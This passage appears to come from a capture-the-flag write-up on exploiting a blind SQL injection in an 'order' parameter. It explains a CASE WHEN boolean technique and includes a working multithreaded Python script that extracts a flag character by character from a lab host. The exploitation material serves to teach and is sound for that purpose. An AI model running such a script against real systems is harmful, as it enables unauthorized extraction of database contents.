This parameter is a strong candidate for injection testing.

💉 Identifying SQL Injection
Testing basic payloads in the order parameter suggests backend SQL query manipulation.
The behavior indicates a Blind SQL Injection, where:


No direct output is shown


But responses differ based on query conditions



🧪 Exploitation Strategy
We exploit the order parameter using a conditional SQL query:
(CASE WHEN (condition) THEN title ELSE date END)
🔑 Idea:


If condition is TRUE → response matches normal page (title)


If condition is FALSE → response differs (date)


This allows us to extract data character by character.

⚙️ Automation Script
To efficiently extract the flag, we use a Python script with multithreading.
import requests as reqimport stringimport concurrent.futuresurl  = 'http://10.66.138.51/?order='yes = req.get(url+"title").textdef check(counter,c):    query = f'(CASE WHEN (SELECT SUBSTRING(flag,1,{counter}) from flag)="{flag+c}" then title else date end)'    res = req.get(url+query).text    if(res==yes):        return cwith concurrent.futures.ThreadPoolExecutor() as executor:    flag=""    counter = 1    chars = string.ascii_letters + string.digits + "{" + "}"    while(1):        results = [executor.submit(check, counter, c) for c in chars]        for future in concurrent.futures.as_completed(results):            result = future.result()            if(result):                counter+=1                flag+=result                print("[+] Current Flag is",flag)                if(flag[-1:]=="}"):                    exit()

⚡ How the Script Works


Sends a baseline request:
yes = req.get(url+"title").text


Iterates through possible characters:


a-z, A-Z, 0-9, {, }




Uses SQL condition:
SELECT SUBSTRING(flag,1,N)


Compares response:


If response matches baseline → correct character




Builds the flag incrementally


Stops when } is found



